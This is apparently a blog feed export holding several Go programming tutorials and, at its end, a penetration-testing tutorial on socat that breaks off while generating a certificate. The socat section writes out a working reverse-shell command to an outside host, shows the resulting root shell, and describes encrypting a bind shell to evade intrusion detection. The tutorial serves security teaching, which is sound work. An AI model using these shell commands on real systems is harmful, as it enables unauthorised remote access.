class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// math_test.go</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;testing&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">TestAdd</span><span class="params">(t *testing.T)</span></span> &#123;</span><br><span class="line">    result := Add(<span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line">    expected := <span class="number">5</span></span><br><span class="line">    <span class="keyword">if</span> result != expected &#123;</span><br><span class="line">        t.Errorf(<span class="string">&quot;Add(2, 3) returned %d, expected %d&quot;</span>, result, expected)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>In math_test.go, we import the testing package and write a test function named TestAdd. Test functions should start with ‘Test’ and accept a <strong><em>*testing.T</em></strong> parameter, which is used to report test failures.</p><p>Inside the TestAdd function, we call Add(2, 3) to execute the function being tested and compare the result to the expected value. If the result doesn’t match the expected value, we use <strong><em>t.Errorf</em></strong> to report the test failure with detailed error information.</p><p>Next, you can run the tests using the ‘<strong><em>go test</em></strong>‘ command in your terminal:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go <span class="built_in">test</span></span><br></pre></td></tr></table></figure><p>Go will search for all the <strong><em>_test.go</em></strong> files <strong><em>in the current directory and execute the test functions within them</em></strong>. If the tests pass, you’ll see a success message. If the tests fail, you’ll get detailed failure information.</p><p>This is just a very basic example. In real-world projects, you can write more test cases to cover various scenarios and ensure that your code works correctly in different situations.”</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;To test a Go file, you typically need to create a test file in the same directory as the file you’re testing and write your test code wit</summary>
      
    
    
    
    <category term="Go" scheme="http://example.com/categories/Go/"/>
    
    <category term="Unit Test" scheme="http://example.com/categories/Go/Unit-Test/"/>
    
    
  </entry>
  
  <entry>
    <title>nil in the Go language</title>
    <link href="http://example.com/2019/01/03/goNil/"/>
    <id>http://example.com/2019/01/03/goNil/</id>
    <published>2019-01-04T03:59:12.000Z</published>
    <updated>2023-10-17T15:38:41.786Z</updated>
    
    <content type="html"><![CDATA[<p>In the Go language, “<strong><em>nil</em></strong>“ is a special predefined value commonly used to represent zero values or missing values in certain data structures. Here are some common usages and scenarios for “<strong><em>nil</em></strong>“:</p><ol><li><strong><em>Pointer and Reference Types</em></strong>: The most common use of “<strong><em>nil</em></strong>“ is in pointer and reference types, indicating that a pointer doesn’t point to any valid memory address or a reference doesn’t reference any object. For example, “<strong><em>nil</em></strong>“ is used in the following cases:</li></ol><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ptr *<span class="type">int</span>    <span class="comment">// Declare an integer pointer, its zero value is nil</span></span><br><span class="line"><span class="keyword">var</span> slice []<span class="type">int</span> <span class="comment">// Declare an integer slice, its zero value is nil</span></span><br><span class="line"><span class="keyword">var</span> m <span class="keyword">map</span>[<span class="type">string</span>]<span class="type">int</span> <span class="comment">// Declare a map, its zero value is nil</span></span><br></pre></td></tr></table></figure><ol start="2"><li><strong><em>Interface Types</em></strong>: “<strong><em>nil</em></strong>“ can also be used with interface types, signifying that an interface has no specific implemented value. This can be useful in some cases to check if an interface is empty (uninitialized or unassigned).</li></ol><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> myInterface <span class="keyword">interface</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> myInterface == <span class="literal">nil</span> &#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;The interface is empty&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li><strong><em>Function and Method Return Values</em></strong>: Functions and methods can return multiple values, some of which might be pointer types. In certain situations, returned pointers may be “<strong><em>nil</em></strong>,” indicating that there are no valid return values.</li></ol><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">findValue</span><span class="params">(slice []<span class="type">int</span>, target <span class="type">int</span>)</span></span> (*<span class="type">int</span>, <span class="type">bool</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> i, val := <span class="keyword">range</span> slice &#123;</span><br><span class="line">        <span class="keyword">if</span> val == target &#123;</span><br><span class="line">            <span class="keyword">return</span> &amp;slice[i], <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span>, <span class="literal">false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>It’s important to handle “<strong><em>nil</em></strong>“ with care to avoid runtime errors like null pointer references. It’s a good practice to check whether pointers, slices, maps, and other data structures are “<strong><em>nil</em></strong>“ before accessing them to ensure safety.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;In the Go language, “&lt;strong&gt;&lt;em&gt;nil&lt;/em&gt;&lt;/strong&gt;“ is a special predefined value commonly used to represent zero values or missing value</summary>
      
    
    
    
    <category term="Go" scheme="http://example.com/categories/Go/"/>
    
    <category term="nil" scheme="http://example.com/categories/Go/nil/"/>
    
    
  </entry>
  
  <entry>
    <title>panic() and recover() in the Go Language</title>
    <link href="http://example.com/2018/12/30/goPanicAndRecover/"/>
    <id>http://example.com/2018/12/30/goPanicAndRecover/</id>
    <published>2018-12-31T01:48:46.000Z</published>
    <updated>2023-10-17T15:39:09.027Z</updated>
    
    <content type="html"><![CDATA[<p><strong><em>panic()</em></strong> and <strong><em>recover()</em></strong> are two important functions in the Go language for handling exceptions. Here is a simple example that demonstrates how to use <strong><em>panic()</em></strong> and <strong><em>recover()</em></strong> in Go.</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// A function to simulate a situation that might cause a panic</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">doSomething</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        <span class="keyword">if</span> err := <span class="built_in">recover</span>(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">            fmt.Println(<span class="string">&quot;Panic occurred but recovered:&quot;</span>, err)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;()</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Simulate a problematic situation</span></span><br><span class="line">    num1 := <span class="number">10</span></span><br><span class="line">    num2 := <span class="number">0</span></span><br><span class="line">    result := num1 / num2 <span class="comment">// This will cause a division by zero panic</span></span><br><span class="line">    fmt.Println(<span class="string">&quot;Result is:&quot;</span>, result) <span class="comment">// This won&#x27;t be printed as the panic has already occurred</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;Starting the program&quot;</span>)</span><br><span class="line"></span><br><span class="line">    doSomething()</span><br><span class="line"></span><br><span class="line">    fmt.Println(<span class="string">&quot;Program continues to execute&quot;</span>) <span class="comment">// Even if a panic occurs, this line will be printed because the panic has been recovered in doSomething()</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>In the example above, the doSomething() function attempts to divide 10 by 0, which would lead to a division by zero panic. However, we use <strong><em>defer()</em></strong> and <strong><em>recover()</em></strong> to catch and handle the panic. In the main() function, even if a panic occurs within doSomething(), the program continues to execute, and the panic information is printed within the <strong><em>recover()</em></strong> block.</p><p>Running this program will produce the following output:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Starting the program</span><br><span class="line">Panic occurred but recovered: runtime error: <span class="built_in">integer</span> divide by zero</span><br><span class="line">Program continues to execute</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>This demonstrates that the <strong><em>recover()</em></strong> function successfully catches the panic, allowing the program to continue executing without terminating.”</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;&lt;em&gt;panic()&lt;/em&gt;&lt;/strong&gt; and &lt;strong&gt;&lt;em&gt;recover()&lt;/em&gt;&lt;/strong&gt; are two important functions in the Go language for handling exc</summary>
      
    
    
    
    <category term="Go" scheme="http://example.com/categories/Go/"/>
    
    <category term="panic() and recover()" scheme="http://example.com/categories/Go/panic-and-recover/"/>
    
    
  </entry>
  
  <entry>
    <title>defer in the Go Language</title>
    <link href="http://example.com/2018/12/16/goDefer/"/>
    <id>http://example.com/2018/12/16/goDefer/</id>
    <published>2018-12-17T04:33:42.000Z</published>
    <updated>2023-10-17T15:38:15.816Z</updated>
    
    <content type="html"><![CDATA[<p>In Go language, <strong><em>defer</em></strong> is a very useful keyword used for deferring the execution of functions, typically employed for performing cleanup or resource release operations before a function returns.</p><p>A <strong><em>defer</em></strong> statement pushes the function call that should be deferred onto a stack and executes these deferred function calls in a <strong><em>last-in, first-out (LIFO)</em></strong> order just before the current function returns.</p><p>Here are some important features and uses of <strong><em>defer</em></strong>:</p><ol><li><p><strong><em>Deferred Execution</em></strong>: Using the <strong><em>defer</em></strong> keyword ensures that a function call is executed before the containing function returns, whether it returns normally or due to an error.</p></li><li><p><strong><em>Resource Cleanup</em></strong>: Common use cases include closing files, releasing locks, closing database connections, and other cleanup operations to prevent resource leaks.</p></li><li><p><strong><em>Parameter Evaluation</em></strong>: The parameters in a <strong><em>defer</em></strong> statement are evaluated when the <strong><em>defer</em></strong> statement is executed, not when the function returns.</p></li></ol><p>Here are some examples demonstrating the use of <strong><em>defer</em></strong>:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// Example 1: defer for file closing</span></span><br><span class="line">    file := openFile(<span class="string">&quot;example.txt&quot;</span>)</span><br><span class="line">    <span class="keyword">defer</span> closeFile(file)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Example 2: defer for logging function execution time</span></span><br><span class="line">    <span class="keyword">defer</span> logTime(<span class="string">&quot;Function execution&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Example 3: Multiple defer statements execute in a last-in, first-out order</span></span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">1</span>; i &lt;= <span class="number">5</span>; i++ &#123;</span><br><span class="line">        <span class="keyword">defer</span> fmt.Println(<span class="string">&quot;Deferred statement&quot;</span>, i)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fmt.Println(<span class="string">&quot;Function body&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">openFile</span><span class="params">(filename <span class="type">string</span>)</span></span> *File &#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;Opening file:&quot;</span>, filename)</span><br><span class="line">    <span class="keyword">return</span> <span class="comment">// Open the file and return the file handle</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">closeFile</span><span class="params">(file *File)</span></span> &#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;Closing file&quot;</span>)</span><br><span class="line">    <span class="comment">// Close the file</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">logTime</span><span class="params">(message <span class="type">string</span>)</span></span> &#123;</span><br><span class="line">    fmt.Println(message, <span class="string">&quot;at some time&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>In the above examples, <strong><em>defer</em></strong> statements are used to ensure the file is closed before main returns, log the execution time of the function, and execute multiple <strong><em>defer</em></strong> statements in a last-in, first-out order.</p><p><strong><em>defer</em></strong> is a powerful tool in Go that can help you write safer and cleaner code, ensuring proper resource release and consistency.”</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;In Go language, &lt;strong&gt;&lt;em&gt;defer&lt;/em&gt;&lt;/strong&gt; is a very useful keyword used for deferring the execution of functions, typically employe</summary>
      
    
    
    
    <category term="Go" scheme="http://example.com/categories/Go/"/>
    
    <category term="defer" scheme="http://example.com/categories/Go/defer/"/>
    
    
  </entry>
  
  <entry>
    <title>Closure and Anonymous Function in Go</title>
    <link href="http://example.com/2018/11/28/goAnonymousFunctionClosure/"/>
    <id>http://example.com/2018/11/28/goAnonymousFunctionClosure/</id>
    <published>2018-11-29T02:21:24.000Z</published>
    <updated>2023-10-17T15:38:03.764Z</updated>
    
    <content type="html"><![CDATA[<p>In Go language, <strong><em>closures</em></strong> and <strong><em>anonymous functions</em></strong> are both forms of functions, but they have some important differences. Below, I will provide examples of the usage and differences between these two concepts:</p><ol><li><strong><em>Closure</em></strong> Example:<br>A <strong><em>closure</em></strong> refers to a function that captures one or more variables from its outer function scope and can be called outside of that function while still accessing these captured variables.</li></ol><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    outerVar := <span class="number">10</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Closure function</span></span><br><span class="line">    closure := <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        fmt.Println(<span class="string">&quot;Outer variable outerVar:&quot;</span>, outerVar)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Call the closure function</span></span><br><span class="line">    closure() <span class="comment">// Output: Outer variable outerVar: 10</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Modify the outer variable</span></span><br><span class="line">    outerVar = <span class="number">20</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Call the closure function again</span></span><br><span class="line">    closure() <span class="comment">// Output: Outer variable outerVar: 20</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>In the above example, <strong><em>closure</em></strong> is a closure that captures the outer variable outerVar and can access and modify that variable even outside the function.</p><ol start="2"><li><strong><em>Anonymous Function</em></strong> Example:</li></ol><p>An <strong><em>anonymous function</em></strong> is a function without a name; it can be directly assigned to a variable or passed as an argument to other functions.</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// Define and call an anonymous function</span></span><br><span class="line">    result := <span class="function"><span class="keyword">func</span><span class="params">(x, y <span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> x + y</span><br><span class="line">    &#125;(<span class="number">5</span>, <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    fmt.Println(<span class="string">&quot;Result of the anonymous function:&quot;</span>, result) <span class="comment">// Output: Result of the anonymous function: 8</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Assign an anonymous function to a variable</span></span><br><span class="line">    add := <span class="function"><span class="keyword">func</span><span class="params">(x, y <span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> x + y</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    sum := add(<span class="number">10</span>, <span class="number">20</span>)</span><br><span class="line">    fmt.Println(<span class="string">&quot;Calling the anonymous function using a variable:&quot;</span>, sum) <span class="comment">// Output: Calling the anonymous function using a variable: 30</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>In the above example, we define an <strong><em>anonymous function</em></strong> and call it directly. We also assign another <strong><em>anonymous function</em></strong> to the add variable and use that variable to call the function.</p><p>To summarize the differences:</p><p>A <strong><em>closure</em></strong> is a function that captures external variables and can access and modify them outside of the function.<br>An <strong><em>anonymous function</em></strong> is a function without a name, which can be assigned to a variable or passed as an argument to other functions.<br>It’s important to note that while <strong><em>closures</em></strong> often involve <strong><em>anonymous functions</em></strong>, not all <strong><em>anonymous functions</em></strong> are <strong><em>closures</em></strong>. A <strong><em>closure</em></strong> is a specific type of <strong><em>anonymous function</em></strong> that captures external variables.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;In Go language, &lt;strong&gt;&lt;em&gt;closures&lt;/em&gt;&lt;/strong&gt; and &lt;strong&gt;&lt;em&gt;anonymous functions&lt;/em&gt;&lt;/strong&gt; are both forms of functions, but the</summary>
      
    
    
    
    <category term="Go" scheme="http://example.com/categories/Go/"/>
    
    <category term="Closure and Anonymous Function" scheme="http://example.com/categories/Go/Closure-and-Anonymous-Function/"/>
    
    
  </entry>
  
  <entry>
    <title>A Brief Summary of &quot;go func()&quot;</title>
    <link href="http://example.com/2018/11/16/goFunc/"/>
    <id>http://example.com/2018/11/16/goFunc/</id>
    <published>2018-11-17T04:00:34.000Z</published>
    <updated>2023-10-23T14:48:54.676Z</updated>
    
    <content type="html"><![CDATA[<p><strong><em>“go func()”</em></strong> is a way in the Go programming language to launch new concurrent goroutines. A goroutine is a lightweight thread in Go used for concurrent task execution. Using <strong><em>“go func()”</em></strong> allows you to create new concurrent execution flows in your program without the need to explicitly create threads or manage the complexity of thread management.</p><p>Here is a basic example and some key concepts of using <strong><em>“go func()”</em></strong>:</p><p>Basic Example:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        <span class="comment">// Place the code you want to execute in a new concurrent goroutine here</span></span><br><span class="line">    &#125;()</span><br><span class="line"></span><br><span class="line">    <span class="comment">// The main goroutine continues to execute other work</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>In the example above, <strong><em>“go func()”</em></strong> starts a concurrent goroutine for an anonymous function, which will execute the code inside it. The main goroutine continues to execute other tasks, while the new concurrent goroutine runs in the background.</p><p>Key Concepts:</p><ol><li><p><strong><em>Anonymous Function</em></strong>: Anonymous functions are typically used to define <strong><em>“go func()”</em></strong> because there’s no need to name the concurrent goroutine. The code for the anonymous function can be enclosed in {} as needed.</p></li><li><p><strong><em>Concurrent Execution</em></strong>: Goroutines launched with <strong><em>“go func()”</em></strong> run concurrently in the background without blocking the main program’s execution. This allows you to execute multiple tasks simultaneously, improving program performance.</p></li><li><p><strong><em>Data Sharing</em></strong>: Concurrent goroutines can share data, but it’s important to handle shared data carefully to avoid race conditions and data races. You can use tools provided by the “sync” package to manage access to shared data.</p></li><li><p><strong><em>Goroutine Management</em></strong>: Go’s runtime system is responsible for creating, scheduling, and destroying goroutines. You don’t need to worry about the complexity of thread creation and destruction.</p></li><li><p><strong><em>Waiting for Goroutines to Complete</em></strong>: If you need to wait for concurrent goroutines to finish, you can use mechanisms like “sync.WaitGroup” or channels to implement waiting.</p></li></ol><p>Using <strong><em>“go func()”</em></strong> is a simple way to achieve concurrency in the Go programming language, allowing you to run tasks in parallel, such as handling concurrent requests, performing background tasks, or other work that needs to execute simultaneously. However, be cautious about handling concurrency issues and ensuring that shared data is synchronized and accessed correctly.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;&lt;em&gt;“go func()”&lt;/em&gt;&lt;/strong&gt; is a way in the Go programming language to launch new concurrent goroutines. A goroutine is a light</summary>
      
    
    
    
    <category term="Go" scheme="http://example.com/categories/Go/"/>
    
    <category term="go func()" scheme="http://example.com/categories/Go/go-func/"/>
    
    
    <category term="go" scheme="http://example.com/tags/go/"/>
    
  </entry>
  
  <entry>
    <title>Socat</title>
    <link href="http://example.com/2016/12/05/Pentest-socat/"/>
    <id>http://example.com/2016/12/05/Pentest-socat/</id>
    <published>2016-12-06T00:26:27.000Z</published>
    <updated>2023-10-21T22:00:20.508Z</updated>
    
    <content type="html"><![CDATA[<p>Socat is a command-line utility that establishes two bidirectional byte streams and transfers data<br>between them. For penetration testing, it is similar to Netcat but has additional useful features.</p><p>While there are a multitude of things that socat can do, we will only cover a few of them to illustrate<br>its use.</p><h1 id="Socat-File-Transfers"><a href="#Socat-File-Transfers" class="headerlink" title="Socat File Transfers"></a>Socat File Transfers</h1><p>Server side:</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/Desktop]</span><br><span class="line">└─# socat TCP4-LISTEN:443,fork file:nmap-list.txt </span><br></pre></td></tr></table></figure><p>Client side:</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator\Desktop\socat&gt; socat TCP4:192.168.244.140:443 file:nmap-list.txt ,create</span><br><span class="line">C:\Users\Administrator\Desktop\socat&gt; type nmap-list.txt</span><br><span class="line">Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-17 23:19 EDT</span><br><span class="line">Warning: 199.241.133.26 giving up on port because retransmission cap hit (10).</span><br><span class="line">Stats: 0:07:04 elapsed; 0 hosts completed (64 up), 64 undergoing SYN Stealth Scan</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h1 id="Socat-Reverse-Shells"><a href="#Socat-Reverse-Shells" class="headerlink" title="Socat Reverse Shells"></a>Socat Reverse Shells</h1><p>Server side:</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator\Desktop\socat&gt; socat -d -d TCP4-LISTEN:443 STDOUT</span><br><span class="line">... socat[5640] N listening on AF=2 0.0.0.0:443</span><br></pre></td></tr></table></figure><p>Client side:<br>When client side type follow command :</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/Desktop]</span><br><span class="line">└─# socat TCP4:192.168.244.140:443 EXEC:/bin/bash</span><br></pre></td></tr></table></figure><p>Then the server side , look like:</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator\Desktop\socat&gt; socat -d -d TCP4-LISTEN:443 STDOUT</span><br><span class="line">... socat[5640] N listening on AF=2 0.0.0.0:443</span><br><span class="line">... socat[5640] N accepting connection from AF=2 192.168.244.140:54720 on 192.168.244.144:443</span><br><span class="line">... socat[5640] N using stdout for reading and writing</span><br><span class="line">... socat[5640] N starting data transfer loop with FDs [4,4] and [1,1]</span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure><h1 id="Socat-Encrypted-Bind-Shells"><a href="#Socat-Encrypted-Bind-Shells" class="headerlink" title="Socat Encrypted Bind Shells"></a>Socat Encrypted Bind Shells</h1><p>To add encryption to a bind shell, we will rely on Secure Socket Layer certificates. This level of<br>encryption will assist in evading intrusion detection systems (IDS) and will help hide the sensitive<br>data we are transceiving.<br>To continue with the example, we will use the openssl application to create a selfsigned certificate using the following options:<br>• req: initiate a new certificate signing request<br>• -newkey: generate a new private key<br>• rsa:2048: use RSA encryption with a 2,048-bit key length.<br>• -nodes: store the private key without passphrase protection<br>• -keyout: save the key to a file<br>• -x509: output a self-signed certificate instead of a certificate request<br>• -days: set validity period in days<br>• -out: save the certificate to a file</p><p>Once we generate the key, we will cat the certificate and its private key into a file, which we will<br>eventually use to encrypt our bind shell.</p><p>Server side:</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/Desktop]</span><br><span class="line">└─# openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt</span><br><span class="line">...+..+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*.+.....+.+...+.....+......+.+......+.....+.......+.....+...............+.+.....+.+......+...+..+....+...+...+..................+.........+...+.....+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*.....+......+......+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span><br><span class="line">.+.+......+...+..+.+.....+.........+......+...+.........+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*..............+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*....+....+........+....+.....+.+.....+...+.......+..+.......+........+.+.....+.+...+........+.........+..................+......+.........+......+..........+.........+..+....+.........+......+.........+...+..+...+....+........+......+.+.........+......+...........+...+.......+...........................+.....+.......+......+........+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span><br><span class="line">-----</span><br><span class="line">You are about to be asked to enter information that will be incorporated</span><br><span class="line">into your certificate request.</span><br><span class="line">What you are about to enter is what is called a Distinguished Name or a DN.</span><br><span class="line">There are quite a few fields but you can leave some blank</span><br><span 